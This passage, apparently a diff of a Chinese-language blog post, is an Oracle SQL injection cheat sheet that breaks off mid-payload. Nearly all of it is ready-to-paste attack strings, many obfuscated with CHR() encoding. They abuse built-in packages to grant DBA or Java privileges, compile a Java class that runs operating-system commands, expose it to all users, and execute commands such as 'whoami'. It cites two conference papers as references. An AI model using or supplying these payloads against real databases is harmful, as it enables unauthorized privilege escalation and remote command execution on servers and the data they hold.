+(select DBMS_REPCAT_RPC.VALIDATE_REMOTE_RC(CHR(85)||CHR(83)||CHR(69)||CHR(82)||CHR(44)||CHR(86)||CHR(65)||CHR(76)||CHR(73)||CHR(68)||CHR(65)||CHR(84)||CHR(69)||CHR(95)||CHR(71)||CHR(82)||CHR(80)||CHR(95)||CHR(79)||CHR(66)||CHR(74)||CHR(69)||CHR(67)||CHR(84)||CHR(83)||CHR(95)||CHR(76)||CHR(79)||CHR(67)||CHR(65)||CHR(76)||CHR(40)||CHR(58)||CHR(99)||CHR(97)||CHR(110)||CHR(111)||CHR(110)||CHR(95)||CHR(103)||CHR(110)||CHR(97)||CHR(109)||CHR(101)||CHR(41)||CHR(59)||CHR(32)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(117)||CHR(116)||CHR(101)||CHR(32)||CHR(105)||CHR(109)||CHR(109)||CHR(101)||CHR(100)||CHR(105)||CHR(97)||CHR(116)||CHR(101)||CHR(32)||CHR(39)||CHR(100)||CHR(101)||CHR(99)||CHR(108)||CHR(97)||CHR(114)||CHR(101)||CHR(32)||CHR(112)||CHR(114)||CHR(97)||CHR(103)||CHR(109)||CHR(97)||CHR(32)||CHR(97)||CHR(117)||CHR(116)||CHR(111)||CHR(110)||CHR(111)||CHR(109)||CHR(111)||CHR(117)||CHR(115)||CHR(95)||CHR(116)||CHR(114)||CHR(97)||CHR(110)||CHR(115)||CHR(97)||CHR(99)||CHR(116)||CHR(105)||CHR(111)||CHR(110)||CHR(59)||CHR(98)||CHR(101)||CHR(103)||CHR(105)||CHR(110)||CHR(32)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(117)||CHR(116)||CHR(101)||CHR(32)||CHR(105)||CHR(109)||CHR(109)||CHR(101)||CHR(100)||CHR(105)||CHR(97)||CHR(116)||CHR(101)||CHR(32)||CHR(39)||CHR(39)||CHR(103)||CHR(114)||CHR(97)||CHR(110)||CHR(116)||CHR(32)||CHR(100)||CHR(98)||CHR(97)||CHR(32)||CHR(116)||CHR(111)||CHR(32)||CHR(97)||CHR(97)||CHR(97)||CHR(97)||CHR(39)||CHR(39)||CHR(59)||CHR(101)||CHR(110)||CHR(100)||CHR(59)||CHR(39)||CHR(59)||CHR(32)||CHR(101)||CHR(110)||CHR(100)||CHR(59)||CHR(45)||CHR(45)||CHR(44)||CHR(67)||CHR(67)||CHR(67)||CHR(67))from dual) is not null--
+
+Only DBA can call this function
+(select SYS.KUPP$PROC.CREATE_MASTER_PROCESS(begin execute immediate 'grant javasyspriv to SYSTEM';end;)from dual) is not null   
+' AND (select SYS.KUPP$PROC.CREATE_MASTER_PROCESS(CHR(98)||CHR(101)||CHR(103)||CHR(105)||CHR(110)||CHR(32)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(117)||CHR(116)||CHR(101)||CHR(32)||CHR(105)||CHR(109)||CHR(109)||CHR(101)||CHR(100)||CHR(105)||CHR(97)||CHR(116)||CHR(101)||CHR(32)||CHR(39)||CHR(103)||CHR(114)||CHR(97)||CHR(110)||CHR(116)||CHR(32)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(115)||CHR(121)||CHR(115)||CHR(112)||CHR(114)||CHR(105)||CHR(118)||CHR(32)||CHR(116)||CHR(111)||CHR(32)||CHR(83)||CHR(89)||CHR(83)||CHR(84)||CHR(69)||CHR(77)||CHR(39)||CHR(59)||CHR(101)||CHR(110)||CHR(100)||CHR(59))from dual) is not null-- 
+
+参考文章
+http://www.nocoug.org/download/2013-02/NoCOUG_201302_Slavik_Markovich_SQL_Injection_in_Web_Applications.pdf
+https://media.blackhat.com/bh-us-10/whitepapers/Siddharth/BlackHat-USA-2010-Siddharth-Hacking-Oracle-from-the-Web-wp.pdf
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;ul&gt;
+  &lt;li&gt;命令执行&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1. hacking 10g  Oracle 8.1.7.4, 9.2.0.1 - 9.2.0.7, 10.1.0.2 - 10.1.0.4, 10.2.0.1-10.2.0.2
+ORACLE DATABASE 10G ENTERPRISE EDITION RELEASE 10.2.0.1.0（该版本虚拟机丢失 之前测试成功)
+1. 提升TEST用户到dba权限    TEST用户名要大写
+' and (select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('foo','bar','DBMS_OUTPUT&quot;.PUT_LINE(:P1); EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION; BEGIN EXECUTE IMMEDIATE ''''grant dba to TEST''''; END;''; END;--', '', 0, '1', 0) from dual)=0--
+2. 创建Java包
+' and (select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('foo','bar','DBMS_OUTPUT&quot;.PUT_LINE(:P1); EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION; BEGIN EXECUTE IMMEDIATE ''''create or replace and compile java source named &quot;SasugaOracle&quot; as import java.lang.*;import java.io.*;class SasugaOracle{public static String exec(String cmd){String ret=&quot;&quot;,tmp;try{BufferedReader reader=new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));while ((tmp=reader.readLine())!=null){ret+=tmp;}reader.close();}catch(Exception ex){ret=ex.toString();}return ret;}}''''; END;''; END;--', '', 0, '1', 0) from dual)=0--
+3. 赋予Java权限
+' and (select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''begin dbms_java.grant_permission(''''''''PUBLIC'''''''', ''''''''SYS:java.io.FilePermission'''''''',''''''''&amp;lt;&amp;gt;'''''''',''''''''execute''''''''); end;'''';END;'';END;--','SYS',0,'1',0) from dual)=0--
+创建runcmd函数
+' and (select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace function runcmd(cmd in varchar2) return varchar2 as language java name ''''''''SasugaOracle.exec(java.lang.String) return java.lang.String'''''''';'''';END;'';END;--','SYS',0,'1',0) from dual)=0--
+4. 赋予所有人执行权限
+' and (select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant execute on runcmd to public'''';END;'';END;--','SYS',0,'1',0) from dual)=0--
+5.命令执行
+' and 1=2 union select 1,sys.runcmd('cmd /c ver'),2 from dual--
+
+2. hacking Oracle Database 11.1.0.7.0 以及更低版本(The 11.2.0.1 April CPU patch fixes this)
+当前用户有dba权限
+1. #赋予SYSTEM Javasyspriv Only DBA can call this function
+(select SYS.KUPP$PROC.CREATE_MASTER_PROCESS(begin execute immediate 'grant javasyspriv to SYSTEM';end;)from dual) is not null   
+' AND (select SYS.KUPP$PROC.CREATE_MASTER_PROCESS(CHR(98)||CHR(101)||CHR(103)||CHR(105)||CHR(110)||CHR(32)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(117)||CHR(116)||CHR(101)||CHR(32)||CHR(105)||CHR(109)||CHR(109)||CHR(101)||CHR(100)||CHR(105)||CHR(97)||CHR(116)||CHR(101)||CHR(32)||CHR(39)||CHR(103)||CHR(114)||CHR(97)||CHR(110)||CHR(116)||CHR(32)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(115)||CHR(121)||CHR(115)||CHR(112)||CHR(114)||CHR(105)||CHR(118)||CHR(32)||CHR(116)||CHR(111)||CHR(32)||CHR(83)||CHR(89)||CHR(83)||CHR(84)||CHR(69)||CHR(77)||CHR(39)||CHR(59)||CHR(101)||CHR(110)||CHR(100)||CHR(59))from dual) is not null-- 
+2. 创建javaexec包
+' and (select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate ''create or replace and resolve java source named &quot;javaexec&quot; as import java.lang.*;import java.io.*;public class javaexec{public static String Ecmd(String ss) throws IOException{BufferedReader mR= new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(ss).getInputStream()));String st,str=&quot;&quot;;while ((st=mR.readLine()) != null) str += st+&quot;\n&quot;;mR.close();return str;}}'';commit; end;') from dual) where rownum=1--
+' and (select dbms_xmlquery.newcontext(CHR(100)||CHR(101)||CHR(99)||CHR(108)||CHR(97)||CHR(114)||CHR(101)||CHR(32)||CHR(80)||CHR(82)||CHR(65)||CHR(71)||CHR(77)||CHR(65)||CHR(32)||CHR(65)||CHR(85)||CHR(84)||CHR(79)||CHR(78)||CHR(79)||CHR(77)||CHR(79)||CHR(85)||CHR(83)||CHR(95)||CHR(84)||CHR(82)||CHR(65)||CHR(78)||CHR(83)||CHR(65)||CHR(67)||CHR(84)||CHR(73)||CHR(79)||CHR(78)||CHR(59)||CHR(32)||CHR(98)||CHR(101)||CHR(103)||CHR(105)||CHR(110)||CHR(32)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(117)||CHR(116)||CHR(101)||CHR(32)||CHR(105)||CHR(109)||CHR(109)||CHR(101)||CHR(100)||CHR(105)||CHR(97)||CHR(116)||CHR(101)||CHR(32)||CHR(39)||CHR(99)||CHR(114)||CHR(101)||CHR(97)||CHR(116)||CHR(101)||CHR(32)||CHR(111)||CHR(114)||CHR(32)||CHR(114)||CHR(101)||CHR(112)||CHR(108)||CHR(97)||CHR(99)||CHR(101)||CHR(32)||CHR(97)||CHR(110)||CHR(100)||CHR(32)||CHR(114)||CHR(101)||CHR(115)||CHR(111)||CHR(108)||CHR(118)||CHR(101)||CHR(32)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(32)||CHR(115)||CHR(111)||CHR(117)||CHR(114)||CHR(99)||CHR(101)||CHR(32)||CHR(110)||CHR(97)||CHR(109)||CHR(101)||CHR(100)||CHR(32)||CHR(34)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(34)||CHR(32)||CHR(97)||CHR(115)||CHR(32)||CHR(105)||CHR(109)||CHR(112)||CHR(111)||CHR(114)||CHR(116)||CHR(32)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(46)||CHR(108)||CHR(97)||CHR(110)||CHR(103)||CHR(46)||CHR(42)||CHR(59)||CHR(105)||CHR(109)||CHR(112)||CHR(111)||CHR(114)||CHR(116)||CHR(32)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(46)||CHR(105)||CHR(111)||CHR(46)||CHR(42)||CHR(59)||CHR(112)||CHR(117)||CHR(98)||CHR(108)||CHR(105)||CHR(99)||CHR(32)||CHR(99)||CHR(108)||CHR(97)||CHR(115)||CHR(115)||CHR(32)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(123)||CHR(112)||CHR(117)||CHR(98)||CHR(108)||CHR(105)||CHR(99)||CHR(32)||CHR(115)||CHR(116)||CHR(97)||CHR(116)||CHR(105)||CHR(99)||CHR(32)||CHR(83)||CHR(116)||CHR(114)||CHR(105)||CHR(110)||CHR(103)||CHR(32)||CHR(69)||CHR(99)||CHR(109)||CHR(100)||CHR(40)||CHR(83)||CHR(116)||CHR(114)||CHR(105)||CHR(110)||CHR(103)||CHR(32)||CHR(115)||CHR(115)||CHR(41)||CHR(32)||CHR(116)||CHR(104)||CHR(114)||CHR(111)||CHR(119)||CHR(115)||CHR(32)||CHR(73)||CHR(79)||CHR(69)||CHR(120)||CHR(99)||CHR(101)||CHR(112)||CHR(116)||CHR(105)||CHR(111)||CHR(110)||CHR(123)||CHR(66)||CHR(117)||CHR(102)||CHR(102)||CHR(101)||CHR(114)||CHR(101)||CHR(100)||CHR(82)||CHR(101)||CHR(97)||CHR(100)||CHR(101)||CHR(114)||CHR(32)||CHR(109)||CHR(82)||CHR(61)||CHR(32)||CHR(110)||CHR(101)||CHR(119)||CHR(32)||CHR(66)||CHR(117)||CHR(102)||CHR(102)||CHR(101)||CHR(114)||CHR(101)||CHR(100)||CHR(82)||CHR(101)||CHR(97)||CHR(100)||CHR(101)||CHR(114)||CHR(40)||CHR(110)||CHR(101)||CHR(119)||CHR(32)||CHR(73)||CHR(110)||CHR(112)||CHR(117)||CHR(116)||CHR(83)||CHR(116)||CHR(114)||CHR(101)||CHR(97)||CHR(109)||CHR(82)||CHR(101)||CHR(97)||CHR(100)||CHR(101)||CHR(114)||CHR(40)||CHR(82)||CHR(117)||CHR(110)||CHR(116)||CHR(105)||CHR(109)||CHR(101)||CHR(46)||CHR(103)||CHR(101)||CHR(116)||CHR(82)||CHR(117)||CHR(110)||CHR(116)||CHR(105)||CHR(109)||CHR(101)||CHR(40)||CHR(41)||CHR(46)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(40)||CHR(115)||CHR(115)||CHR(41)||CHR(46)||CHR(103)||CHR(101)||CHR(116)||CHR(73)||CHR(110)||CHR(112)||CHR(117)||CHR(116)||CHR(83)||CHR(116)||CHR(114)||CHR(101)||CHR(97)||CHR(109)||CHR(40)||CHR(41)||CHR(41)||CHR(41)||CHR(59)||CHR(83)||CHR(116)||CHR(114)||CHR(105)||CHR(110)||CHR(103)||CHR(32)||CHR(115)||CHR(116)||CHR(44)||CHR(115)||CHR(116)||CHR(114)||CHR(61)||CHR(34)||CHR(34)||CHR(59)||CHR(119)||CHR(104)||CHR(105)||CHR(108)||CHR(101)||CHR(32)||CHR(40)||CHR(40)||CHR(115)||CHR(116)||CHR(61)||CHR(109)||CHR(82)||CHR(46)||CHR(114)||CHR(101)||CHR(97)||CHR(100)||CHR(76)||CHR(105)||CHR(110)||CHR(101)||CHR(40)||CHR(41)||CHR(41)||CHR(32)||CHR(33)||CHR(61)||CHR(32)||CHR(110)||CHR(117)||CHR(108)||CHR(108)||CHR(41)||CHR(32)||CHR(115)||CHR(116)||CHR(114)||CHR(32)||CHR(43)||CHR(61)||CHR(32)||CHR(115)||CHR(116)||CHR(43)||CHR(34)||CHR(92)||CHR(110)||CHR(34)||CHR(59)||CHR(109)||CHR(82)||CHR(46)||CHR(99)||CHR(108)||CHR(111)||CHR(115)||CHR(101)||CHR(40)||CHR(41)||CHR(59)||CHR(114)||CHR(101)||CHR(116)||CHR(117)||CHR(114)||CHR(110)||CHR(32)||CHR(115)||CHR(116)||CHR(114)||CHR(59)||CHR(125)||CHR(125)||CHR(39)||CHR(59)||CHR(99)||CHR(111)||CHR(109)||CHR(109)||CHR(105)||CHR(116)||CHR(59)||CHR(32)||CHR(101)||CHR(110)||CHR(100)||CHR(59)) from dual) is not null--
+3.创建javacmd函数
+' and (select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate ''create or replace function javacmd(p_filename in varchar2)return varchar2 as language java name ''''javaexec.Ecmd(java.lang.String)return String'''';''; commit; end;') from dual) where rownum=1--
+' and (select dbms_xmlquery.newcontext(CHR(100)||CHR(101)||CHR(99)||CHR(108)||CHR(97)||CHR(114)||CHR(101)||CHR(32)||CHR(80)||CHR(82)||CHR(65)||CHR(71)||CHR(77)||CHR(65)||CHR(32)||CHR(65)||CHR(85)||CHR(84)||CHR(79)||CHR(78)||CHR(79)||CHR(77)||CHR(79)||CHR(85)||CHR(83)||CHR(95)||CHR(84)||CHR(82)||CHR(65)||CHR(78)||CHR(83)||CHR(65)||CHR(67)||CHR(84)||CHR(73)||CHR(79)||CHR(78)||CHR(59)||CHR(32)||CHR(98)||CHR(101)||CHR(103)||CHR(105)||CHR(110)||CHR(32)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(117)||CHR(116)||CHR(101)||CHR(32)||CHR(105)||CHR(109)||CHR(109)||CHR(101)||CHR(100)||CHR(105)||CHR(97)||CHR(116)||CHR(101)||CHR(32)||CHR(39)||CHR(99)||CHR(114)||CHR(101)||CHR(97)||CHR(116)||CHR(101)||CHR(32)||CHR(111)||CHR(114)||CHR(32)||CHR(114)||CHR(101)||CHR(112)||CHR(108)||CHR(97)||CHR(99)||CHR(101)||CHR(32)||CHR(102)||CHR(117)||CHR(110)||CHR(99)||CHR(116)||CHR(105)||CHR(111)||CHR(110)||CHR(32)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(99)||CHR(109)||CHR(100)||CHR(40)||CHR(112)||CHR(95)||CHR(102)||CHR(105)||CHR(108)||CHR(101)||CHR(110)||CHR(97)||CHR(109)||CHR(101)||CHR(32)||CHR(105)||CHR(110)||CHR(32)||CHR(118)||CHR(97)||CHR(114)||CHR(99)||CHR(104)||CHR(97)||CHR(114)||CHR(50)||CHR(41)||CHR(114)||CHR(101)||CHR(116)||CHR(117)||CHR(114)||CHR(110)||CHR(32)||CHR(118)||CHR(97)||CHR(114)||CHR(99)||CHR(104)||CHR(97)||CHR(114)||CHR(50)||CHR(32)||CHR(97)||CHR(115)||CHR(32)||CHR(108)||CHR(97)||CHR(110)||CHR(103)||CHR(117)||CHR(97)||CHR(103)||CHR(101)||CHR(32)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(32)||CHR(110)||CHR(97)||CHR(109)||CHR(101)||CHR(32)||CHR(39)||CHR(39)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(46)||CHR(69)||CHR(99)||CHR(109)||CHR(100)||CHR(40)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(46)||CHR(108)||CHR(97)||CHR(110)||CHR(103)||CHR(46)||CHR(83)||CHR(116)||CHR(114)||CHR(105)||CHR(110)||CHR(103)||CHR(41)||CHR(114)||CHR(101)||CHR(116)||CHR(117)||CHR(114)||CHR(110)||CHR(32)||CHR(83)||CHR(116)||CHR(114)||CHR(105)||CHR(110)||CHR(103)||CHR(39)||CHR(39)||CHR(59)||CHR(39)||CHR(59)||CHR(32)||CHR(99)||CHR(111)||CHR(109)||CHR(109)||CHR(105)||CHR(116)||CHR(59)||CHR(32)||CHR(101)||CHR(110)||CHR(100)||CHR(59)) from dual) is not null--
+4. 命令执行
+' and 1=2 union select 1,(select javacmd('whoami') from dual),'3' from dual--
+'||utl_inaddr.get_host_name((select javacmd('ping 8.8.8.8') from dual))||'
+
+not dba(11g只需要java.io.permisson即可,10g额外需要readFileDescriptor writeFileDescriptor权限)
+' and (select dbms_xmlquery.newcontext(CHR(100)||CHR(101)||CHR(99)||CHR(108)||CHR(97)||CHR(114)||CHR(101)||CHR(32)||CHR(80)||CHR(82)||CHR(65)||CHR(71)||CHR(77)||CHR(65)||CHR(32)||CHR(65)||CHR(85)||CHR(84)||CHR(79)||CHR(78)||CHR(79)||CHR(77)||CHR(79)||CHR(85)||CHR(83)||CHR(95)||CHR(84)||CHR(82)||CHR(65)||CHR(78)||CHR(83)||CHR(65)||CHR(67)||CHR(84)||CHR(73)||CHR(79)||CHR(78)||CHR(59)||CHR(32)||CHR(98)||CHR(101)||CHR(103)||CHR(105)||CHR(110)||CHR(32)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(117)||CHR(116)||CHR(101)||CHR(32)||CHR(105)||CHR(109)||CHR(109)||CHR(101)||CHR(100)||CHR(105)||CHR(97)||CHR(116)||CHR(101)||CHR(32)||CHR(39)||CHR(99)||CHR(114)||CHR(101)||CHR(97)||CHR(116)||CHR(101)||CHR(32)||CHR(111)||CHR(114)||CHR(32)||CHR(114)||CHR(101)||CHR(112)||CHR(108)||CHR(97)||CHR(99)||CHR(101)||CHR(32)||CHR(97)||CHR(110)||CHR(100)||CHR(32)||CHR(114)||CHR(101)||CHR(115)||CHR(111)||CHR(108)||CHR(118)||CHR(101)||CHR(32)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(32)||CHR(115)||CHR(111)||CHR(117)||CHR(114)||CHR(99)||CHR(101)||CHR(32)||CHR(110)||CHR(97)||CHR(109)||CHR(101)||CHR(100)||CHR(32)||CHR(34)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(34)||CHR(32)||CHR(97)||CHR(115)||CHR(32)||CHR(105)||CHR(109)||CHR(112)||CHR(111)||CHR(114)||CHR(116)||CHR(32)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(46)||CHR(108)||CHR(97)||CHR(110)||CHR(103)||CHR(46)||CHR(42)||CHR(59)||CHR(105)||CHR(109)||CHR(112)||CHR(111)||CHR(114)||CHR(116)||CHR(32)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(46)||CHR(105)||CHR(111)||CHR(46)||CHR(42)||CHR(59)||CHR(112)||CHR(117)||CHR(98)||CHR(108)||CHR(105)||CHR(99)||CHR(32)||CHR(99)||CHR(108)||CHR(97)||CHR(115)||CHR(115)||CHR(32)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(123)||CHR(112)||CHR(117)||CHR(98)||CHR(108)||CHR(105)||CHR(99)||CHR(32)||CHR(115)||CHR(116)||CHR(97)||CHR(116)||CHR(105)||CHR(99)||CHR(32)||CHR(83)||CHR(116)||CHR(114)||CHR(105)||CHR(110)||CHR(103)||CHR(32)||CHR(69)||CHR(99)||CHR(109)||CHR(100)||CHR(40)||CHR(83)||CHR(116)||CHR(114)||CHR(105)||CHR(110)||CHR(103)||CHR(32)||CHR(115)||CHR(115)||CHR(41)||CHR(32)||CHR(116)||CHR(104)||CHR(114)||CHR(111)||CHR(119)||CHR(115)||CHR(32)||CHR(73)||CHR(79)||CHR(69)||CHR(120)||CHR(99)||CHR(101)||CHR(112)||CHR(116)||CHR(105)||CHR(111)||CHR(110)||CHR(123)||CHR(66)||CHR(117)||CHR(102)||CHR(102)||CHR(101)||CHR(114)||CHR(101)||CHR(100)||CHR(82)||CHR(101)||CHR(97)||CHR(100)||CHR(101)||CHR(114)||CHR(32)||CHR(109)||CHR(82)||CHR(61)||CHR(32)||CHR(110)||CHR(101)||CHR(119)||CHR(32)||CHR(66)||CHR(117)||CHR(102)||CHR(102)||CHR(101)||CHR(114)||CHR(101)||CHR(100)||CHR(82)||CHR(101)||CHR(97)||CHR(100)||CHR(101)||CHR(114)||CHR(40)||CHR(110)||CHR(101)||CHR(119)||CHR(32)||CHR(73)||CHR(110)||CHR(112)||CHR(117)||CHR(116)||CHR(83)||CHR(116)||CHR(114)||CHR(101)||CHR(97)||CHR(109)||CHR(82)||CHR(101)||CHR(97)||CHR(100)||CHR(101)||CHR(114)||CHR(40)||CHR(82)||CHR(117)||CHR(110)||CHR(116)||CHR(105)||CHR(109)||CHR(101)||CHR(46)||CHR(103)||CHR(101)||CHR(116)||CHR(82)||CHR(117)||CHR(110)||CHR(116)||CHR(105)||CHR(109)||CHR(101)||CHR(40)||CHR(41)||CHR(46)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(40)||CHR(115)||CHR(115)||CHR(41)||CHR(46)||CHR(103)||CHR(101)||CHR(116)||CHR(73)||CHR(110)||CHR(112)||CHR(117)||CHR(116)||CHR(83)||CHR(116)||CHR(114)||CHR(101)||CHR(97)||CHR(109)||CHR(40)||CHR(41)||CHR(41)||CHR(41)||CHR(59)||CHR(83)||CHR(116)||CHR(114)||CHR(105)||CHR(110)||CHR(103)||CHR(32)||CHR(115)||CHR(116)||CHR(44)||CHR(115)||CHR(116)||CHR(114)||CHR(61)||CHR(34)||CHR(34)||CHR(59)||CHR(119)||CHR(104)||CHR(105)||CHR(108)||CHR(101)||CHR(32)||CHR(40)||CHR(40)||CHR(115)||CHR(116)||CHR(61)||CHR(109)||CHR(82)||CHR(46)||CHR(114)||CHR(101)||CHR(97)||CHR(100)||CHR(76)||CHR(105)||CHR(110)||CHR(101)||CHR(40)||CHR(41)||CHR(41)||CHR(32)||CHR(33)||CHR(61)||CHR(32)||CHR(110)||CHR(117)||CHR(108)||CHR(108)||CHR(41)||CHR(32)||CHR(115)||CHR(116)||CHR(114)||CHR(32)||CHR(43)||CHR(61)||CHR(32)||CHR(115)||CHR(116)||CHR(43)||CHR(34)||CHR(92)||CHR(110)||CHR(34)||CHR(59)||CHR(109)||CHR(82)||CHR(46)||CHR(99)||CHR(108)||CHR(111)||CHR(115)||CHR(101)||CHR(40)||CHR(41)||CHR(59)||CHR(114)||CHR(101)||CHR(116)||CHR(117)||CHR(114)||CHR(110)||CHR(32)||CHR(115)||CHR(116)||CHR(114)||CHR(59)||CHR(125)||CHR(125)||CHR(39)||CHR(59)||CHR(99)||CHR(111)||CHR(109)||CHR(109)||CHR(105)||CHR(116)||CHR(59)||CHR(32)||CHR(101)||CHR(110)||CHR(100)||CHR(59)) from dual) is not null--
+' and (select dbms_xmlquery.newcontext(CHR(100)||CHR(101)||CHR(99)||CHR(108)||CHR(97)||CHR(114)||CHR(101)||CHR(32)||CHR(80)||CHR(82)||CHR(65)||CHR(71)||CHR(77)||CHR(65)||CHR(32)||CHR(65)||CHR(85)||CHR(84)||CHR(79)||CHR(78)||CHR(79)||CHR(77)||CHR(79)||CHR(85)||CHR(83)||CHR(95)||CHR(84)||CHR(82)||CHR(65)||CHR(78)||CHR(83)||CHR(65)||CHR(67)||CHR(84)||CHR(73)||CHR(79)||CHR(78)||CHR(59)||CHR(32)||CHR(98)||CHR(101)||CHR(103)||CHR(105)||CHR(110)||CHR(32)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(117)||CHR(116)||CHR(101)||CHR(32)||CHR(105)||CHR(109)||CHR(109)||CHR(101)||CHR(100)||CHR(105)||CHR(97)||CHR(116)||CHR(101)||CHR(32)||CHR(39)||CHR(99)||CHR(114)||CHR(101)||CHR(97)||CHR(116)||CHR(101)||CHR(32)||CHR(111)||CHR(114)||CHR(32)||CHR(114)||CHR(101)||CHR(112)||CHR(108)||CHR(97)||CHR(99)||CHR(101)||CHR(32)||CHR(102)||CHR(117)||CHR(110)||CHR(99)||CHR(116)||CHR(105)||CHR(111)||CHR(110)||CHR(32)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(99)||CHR(109)||CHR(100)||CHR(40)||CHR(112)||CHR(95)||CHR(102)||CHR(105)||CHR(108)||CHR(101)||CHR(110)||CHR(97)||CHR(109)||CHR(101)||CHR(32)||CHR(105)||CHR(110)||CHR(32)||CHR(118)||CHR(97)||CHR(114)||CHR(99)||CHR(104)||CHR(97)||CHR(114)||CHR(50)||CHR(41)||CHR(114)||CHR(101)||CHR(116)||CHR(117)||CHR(114)||CHR(110)||CHR(32)||CHR(118)||CHR(97)||CHR(114)||CHR(99)||CHR(104)||CHR(97)||CHR(114)||CHR(50)||CHR(32)||CHR(97)||CHR(115)||CHR(32)||CHR(108)||CHR(97)||CHR(110)||CHR(103)||CHR(117)||CHR(97)||CHR(103)||CHR(101)||CHR(32)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(32)||CHR(110)||CHR(97)||CHR(109)||CHR(101)||CHR(32)||CHR(39)||CHR(39)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(46)||CHR(69)||CHR(99)||CHR(109)||CHR(100)||CHR(40)||CHR(106)||CHR(97)||CHR(118)||CHR(97)||CHR(46)||CHR(108)||CHR(97)||CHR(110)||CHR(103)||CHR(46)||CHR(83)||CHR(116)||CHR(114)||CHR(105)||CHR(110)||CHR(103)||CHR(41)||CHR(114)||CHR(101)||CHR(116)||CHR(117)||CHR(114)||CHR(110)||CHR(32)||CHR(83)||CHR(116)||CHR(114)||CHR(105)||CHR(110)||CHR(103)||CHR(39)||CHR(39)||CHR(59)||CHR(39)||CHR(59)||CHR(32)||CHR(99)||CHR(111)||CHR(109)||CHR(109)||CHR(105)||CHR(116)||CHR(59)||CHR(32)||CHR(101)||CHR(110)||CHR(100)||CHR(59)) from dual) is not null--
+' and dbms_xmlquery.newcontext(CHR(100)||CHR(101)||CHR(99)||CHR(108)||CHR(97)||CHR(114)||CHR(101)||CHR(32)||CHR(80)||CHR(82)||CHR(65)||CHR(71)||CHR(77)||CHR(65)||CHR(32)||CHR(65)||CHR(85)||CHR(84)||CHR(79)||CHR(78)||CHR(79)||CHR(77)||CHR(79)||CHR(85)||CHR(83)||CHR(95)||CHR(84)||CHR(82)||CHR(65)||CHR(78)||CHR(83)||CHR(65)||CHR(67)||CHR(84)||CHR(73)||CHR(79)||CHR(78)||CHR(59)||CHR(32)||CHR(32)||CHR(98)||CHR(101)||CHR(103)||CHR(105)||CHR(110)||CHR(32)||CHR(101)||CHR(120)||CHR(101)||CHR(99)||CHR(117)||CHR(116)||CHR(101)||CHR(32)||CHR(105)||CHR(109)||CHR(109)||CHR(101)||CHR(100)||CHR(105)||CHR(97)||CHR(116)||CHR(101)||CHR(32)||CHR(39)||CHR(99)||CHR(114)||CHR(101)||CHR(97)||CHR(116)||CHR(101)||CHR(32)||CHR(111)||CHR(114)||CHR(32)||CHR(114)||CHR(101)||CHR(112)||CHR(108)||CHR(97)||CHR(99)||CHR(101)||CHR(32)||CHR(102)||CHR(117)||CHR(110)||CHR(99)||CHR(116)||CHR(105)||CHR(111)||CHR(110)||CHR(32)||CHR(109)||C